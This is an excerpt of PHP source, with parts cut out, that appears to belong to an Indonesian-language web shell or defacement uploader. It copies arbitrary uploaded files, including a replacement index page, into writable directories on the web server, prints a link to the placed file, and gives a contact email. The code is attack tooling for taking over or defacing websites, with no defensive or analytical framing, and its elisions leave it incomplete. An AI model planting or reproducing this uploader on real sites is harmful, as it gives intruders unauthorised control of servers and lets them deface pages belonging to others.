...
if(isset($_GET["logout"])) {
	...
	$dir = $_FILES["index_file"]["name"];
		$unggah = $address."/".$dir;
if(isset($_POST["unggah"])){
	if(is_writable($address)){
		if(@copy($_FILES["index_file"]["tmp_name"], $unggah)){
			$url = "http://".$_SERVER["HTTP_HOST"]."/";
			echo "<font color='black'>Berhasil Upload : </font><a href='$url$dir' target='_blank'><u>$url$dir</u></a>";
		}else{
			echo "Gagal Upload";
			}
		}
...
($tipe === "mp4") or 
($tipe === "mp4")){
	echo "Gabisa Up Vid/Music <a href='mailto:indonesiamerdekahoree@gmail.com'>Click Me</a>";
				exit;
}else{
	$upload = $server."/".$file;
if(isset($_POST["up"])){
	if(is_writable($server)){
		if(@copy($_FILES["index"]["tmp_name"], $upload)){
			...
			echo "<font color='black'>Berhasil Upload : </font><a href='$web$file' target='_blank'><u>$web$file</u></a>";
		}else{
			echo "Gagal Upload";
			}
		}
